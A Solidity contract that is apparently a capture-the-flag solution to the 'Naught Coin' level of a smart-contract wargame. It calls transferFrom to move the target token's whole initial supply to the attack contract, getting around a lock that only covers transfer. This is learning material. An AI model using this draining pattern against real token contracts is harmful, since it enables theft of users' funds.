// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./15-naught-coin.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Attack15 {
    // state variables
    NaughtCoin public target;

    constructor(address _targetAddress) payable {
        // initialise values
        target = NaughtCoin(_targetAddress);
    }

    // function attack(address _from, address _to, uint256 _amount) public {
    function attack() public {
        // call transferFrom
        target.transferFrom(msg.sender, address(this), target.INITIAL_SUPPLY());
    }
}
